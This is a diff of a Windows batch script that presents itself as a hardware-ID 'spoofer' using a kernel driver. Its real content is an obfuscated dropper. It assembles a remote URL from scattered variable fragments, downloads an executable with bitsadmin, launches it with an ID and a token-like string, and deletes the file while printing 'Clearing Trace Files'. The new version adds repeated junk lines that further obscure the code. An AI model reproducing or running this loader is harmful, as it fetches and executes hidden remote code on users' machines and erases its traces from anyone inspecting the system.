@@ -1,78 +1,237 @@
 chcp 65001
-echo off
-cls
-echo
-echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
-echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
-echo.
-echo.
-echo.
-SET QQA=_
-SET DIS=cod
-SET CRT=NHA
-SET SAVE=proto
-SET PROC=TIONS
-SET FR="DA ED RA FE"
-SET RFA=dis
-SET DEFINE=shared
-SET Q=%CD%
-cls
-echo.
-echo
-echo █▀ █▀█ █▀█ █▀█ █▀▀ █ █▄░█ █▀▀
-echo ▄█ █▀▀ █▄█ █▄█ █▀░ █ █░▀█ █▄█ ▄
-echo.
-SET FS="DZ ZD FA 2E"
-SET FE=PSF
-SET DE=e
-SET DR=x
-SET DZ=e
-SET BR="BB BB FF FE"
-SET D=hu
-SET SO=g
-SET SP=b
-SET DEF=t
-SET D2=i%DEF%
-SET DYNI=com
-SET USR=dr-%CRT%
-cls
-echo.
-echo
-echo █▀ █▀█ █▀█ █▀█ █▀▀ █ █▄░█ █▀▀
-echo ▄█ █▀▀ █▄█ █▄█ █▀░ █ █░▀█ █▄█ ▄
-echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+title SPOOFER LOADING KERNEL
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET REFC=862147348624048138
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET QQA=_
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DIS=cod
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET CRT=NHA
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET SAVE=proto
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET PROC=TIONS
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET FR="DA ED RA FE"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET REFV=7zVx8R2iUngYyKUMcLXxhZqOnEzsDQfhScAif7tqsySAkCoRQKITY5WH6M18v2ompQe8
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET RFA=dis
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DEFINE=shared
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET Q=%CD%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET FS="DZ ZD FA 2E"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET FE=PSF
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DE=e
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DR=x
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DZ=e
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET BR="BB BB FF FE"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET D=hu
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET SO=g
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET SP=b
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DEF=t
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET D2=i%DEF%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DYNI=com
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET USR=dr-%CRT%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET XEP=PEX
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET PTO=JU%XEP%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET REP=%CRT%-PRODUC%PROC%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET DIFI=raw
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET PTC=NHA-
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET X=%FE%.%DE%%DR%%DZ%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET FX=%Q%\%FE%.%DE%%DR%%DZ%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET FR=h
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET RTA=%FR%%DEF%%DEF%ps
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET RGA=/
-cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 echo.
-echo
-echo █▀ █▀█ █▀█ █▀█ █▀▀ █ █▄░█ █▀▀
-echo ▄█ █▀▀ █▄█ █▄█ █▀░ █ █░▀█ █▄█ ▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 echo.
-set DLSS=%RTA%:%RGA%%RGA%%SO%%D2%%D%%SP%.%DYNI%/%USR%/%REP%/%DIFI%/%PTC%%PTO%/%X%
-bitsadmin /transfer myDownloadJob /download /priority high %DLSS% %FX%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 1 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+set DLSS="%RTA%:%RGA%%RGA%%SO%%D2%%D%%SP%.%DYNI%/%USR%/%REP%/%DIFI%/%PTC%%PTO%/%X%"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+bitsadmin /transfer /download /priority high %DLSS% "%FX%"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 cls
-set directory=%Q%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 SET RT="REACT"
-start %FX% %REFC%/%REFV%
-SET DD="DD DD DD DD"
-del /f %FE%.%DE%%DR%%DZ%
-cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 echo.
-echo
-echo █▀ █▀█ █▀█ █▀█ █▀▀ █ █▄░█ █▀▀
-echo ▄█ █▀▀ █▄█ █▄█ █▀░ █ █░▀█ █▄█ ▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
 echo.
-echo Spoof Complete
-echo Spoofing Done By SGA
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+start "" "%FX%" %REFC%
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 3 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 3 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo Clearing Trace Files!
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+ping localhost -n 3 >nul
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo Clearing Trace Files Completed!
+del /f "%FX%"
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo off & cls
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █░█ █░█░█ █ █▀▄   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo     █▀█ ▀▄▀▄▀ █ █▄▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo.
+SET DD="DD DD DD DD FA EA RR AJ DF EX FF MA FF EE RR AA";
+echo FINISHED SPOOF VIA KERNEL DRIVER!
+pause
